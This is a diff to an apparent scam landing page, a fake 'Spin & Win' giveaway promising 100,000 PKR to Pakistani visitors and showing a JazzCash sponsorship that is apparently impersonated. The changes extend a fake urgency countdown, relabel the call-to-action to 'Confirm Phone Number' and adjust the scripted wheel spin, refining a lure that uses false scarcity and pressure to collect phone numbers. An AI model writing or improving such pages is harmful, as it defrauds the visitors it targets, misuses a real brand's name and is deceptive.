@@ -510,7 +510,7 @@
     <h2>Your Phone Number Have Been Chosen!</h2>
     <h2>Spin & Win!</h2>
     <p class="sub">Spin the wheel to win 100,000 PKR <span style="color:var(--accent); font-weight:600;">₨100,000</span> Today!</p>
-    <p class="sub">Thousands of Pakistanis are claiming their prize today — why miss out?</p>
+    <p2 class="sub">Thousands of Pakistanis are claiming their prize today — why miss out?</p2>
 
 
     <div class="engagement">
@@ -576,10 +576,10 @@
       <div class="scarcity-note" id="scarcityNote2">🔥 You are 1 among only 3 selected today!</div>
       <div class="emergency-timer">
         <div>⚠️ OFFER EXPIRES IN</div>
-        <div class="timer-display" id="countdownTimer">00:30</div>
+        <div class="timer-display" id="countdownTimer">00:59</div>
         <div class="timer-label">Tap PROCEED now before it's too late!</div>
       </div>
-      <button class="btn-proceed" id="proceedBtn">PROCEED</button>
+      <button class="btn-proceed" id="proceedBtn">Confirm Phone Number</button>
       <div class="modal-sponsor">
         <span>Sponsored by</span>
         <span style="font-weight:700; color:#e80000;">JazzCash</span>
@@ -823,7 +823,7 @@
 
         const fullSpins = 5;
         const baseOffset = 60;
-        const totalSpinDegrees = (fullSpins * 360) + baseOffset;
+        const totalSpinDegrees = (fullSpins * 365) + baseOffset;
         const tinyJitter = (Math.random() * 4) - 2;
         const finalRotation = totalSpinDegrees + tinyJitter;
 
